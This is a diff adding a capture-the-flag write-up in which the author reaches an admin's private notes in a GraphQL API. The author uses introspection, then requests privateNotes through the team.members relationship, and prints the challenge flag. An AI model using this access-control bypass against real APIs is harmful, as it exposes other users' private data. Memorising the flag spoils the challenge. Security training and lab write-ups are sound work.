@@ -1,0 +1,129 @@
+# GraphQL Private Notes
+
+I started by querying my own user:
+
+graphql
+query {
+	me {
+		id
+		username
+		role
+		privateNotes
+		team {
+			id
+			name
+			members {
+				username
+				role
+			}
+		}
+	}
+}
+
+I got:
+
+username: researcher_417
+role: MEMBER
+team: Research Team 417
+
+members:
+- researcher_417 — MEMBER
+- admin_417 — ADMIN
+
+
+Since this was GraphQL, I checked the schema with introspection.
+
+I found that `User` had these fields:
+
+text
+id
+username
+role
+team
+privateNotes
+
+and Team had:
+
+text
+id
+name
+member
+
+I first tried accessing the admin through the `user(id:)` query:
+
+```graphql
+query {
+	user(id: "admin_417") {
+		id
+		username
+		role
+		privateNotes
+	}
+}
+```
+
+That returned `null`.
+
+So instead, I checked what the `team.members` objects actually exposed. I added `id`:
+
+```graphql
+query {
+	me {
+		team {
+			members {
+				id
+				username
+				role
+			}
+		}
+	}
+}
+```
+
+This gave me:
+
+```text
+researcher_417 → user_417
+admin_417      → admin_417
+```
+
+Now I had the admin as a `User` object through the team relationship.
+
+The important part was testing whether `privateNotes` was protected:
+
+```graphql
+query {
+	me {
+		team {
+			members {
+				id
+				username
+				role
+				privateNotes
+			}
+		}
+	}
+}
+```
+
+And it worked.
+
+The response contained:
+
+```text
+admin_417
+role: ADMIN
+privateNotes: POCTF{81.417.NHSHG2B4C437XDNA.AMODRMGMN7VMQL5FWS3L6T2YQL}
+```
+
+## Flag
+
+```text
+POCTF{81.417.NHSHG2B4C437XDNA.AMODRMGMN7VMQL5FWS3L6T2YQL}
+```
+
+## What was wrong?
+
+The API didn't properly restrict access to `privateNotes`. Even though I was only a `MEMBER`, I could request the admin's `User` object through `team.members` and read the supposedly private field.
+
+**Vulnerability:** Broken access control / unauthorized access to sensitive GraphQL fields.
